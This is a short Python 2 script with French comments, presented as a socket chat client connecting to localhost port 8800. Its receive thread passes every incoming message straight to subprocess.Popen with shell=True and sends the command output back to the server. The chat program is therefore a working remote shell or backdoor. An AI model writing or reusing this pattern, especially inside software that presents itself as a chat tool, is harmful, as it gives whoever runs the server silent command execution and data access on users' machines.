import subprocess
from subprocess import Popen, PIPE, STDOUT
import socket
import sys
import time
from threading import Thread

srvaddr = ('localhost', 8800)
contenu = ''
#parametre de connexion au srv pour le client

print 'Connecting to %s port %s' % srvaddr
clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientsocket.connect(srvaddr)
print clientsocket

def testMessage(self):
    if self == '':
        print "Contenu vide, ecrivez ^^ ! (facepalm)\n"
    else:
        if self == 'exit':
            clientsocket.sendall(self)
            print 'Closing socket'
            clientsocket.close()
        else:
            clientsocket.sendall(self)
            print "Message envoye, en attente de reponses...\n"
            #clientsocket.send(''.join([line for line in p.stdout.xreadlines()]))
            #print "Traitement OK !"
    pass

def sendMessage():
    contenu = raw_input("Saisir le texte a afficher sur le SRV : \nEXIT pour quitter\n")
    testMessage(contenu)
    pass


class mytchatrecep(Thread):

        def run(self):
            while True:
                data = clientsocket.recv(255)
                #le 255 definit le nombre de caracteres envoye en une seule fois
                if data != '':
                    print '\nRecu : "%s"' % data
                    #exec("data")
                    p = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE)
                    #q = Popen(data, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
                    clientsocket.send(''.join([line for line in p.stdout.xreadlines()]))
                    output = p.stdout
                    #clientsocket.sendall(output)
                    print output
                    #print action


class mytchatsend(Thread):

    def run(self):
        while True:
            sendMessage()



Thread_1 = mytchatrecep()
Thread_2 = mytchatsend()
Thread_1.start()
Thread_2.start()
Thread_1.join()
Thread_2.join()

#clientsocket.close()
#print 'Closing socket'
